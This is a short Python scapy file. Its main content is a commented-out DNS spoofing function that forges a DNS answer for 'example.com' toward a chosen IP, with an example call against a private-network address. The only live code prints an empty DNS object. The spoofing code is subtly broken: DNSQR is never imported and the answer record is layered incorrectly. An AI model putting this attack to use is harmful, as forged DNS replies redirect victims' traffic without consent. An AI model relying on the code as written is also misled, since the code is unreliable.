from scapy.all import IP, UDP, DNS, DNSRR, send

# def dns_spoof(target_ip, spoofed_ip):
#     ip = IP(dst=target_ip)
#     udp = UDP(sport=53, dport=53)
#     dns = DNS(id=1234, qr=1, aa=1, qd=DNSQR(qname="example.com", qtype="A"))
#     dns_rr = DNSRR(rrname="example.com", rdata=spoofed_ip)

#     packet = ip / udp / dns / dns_rr
#     send(packet, verbose=False)

# # Example usage
# dns_spoof("192.168.43.153", "192.168.43.1")


dns = DNS()

dns.show()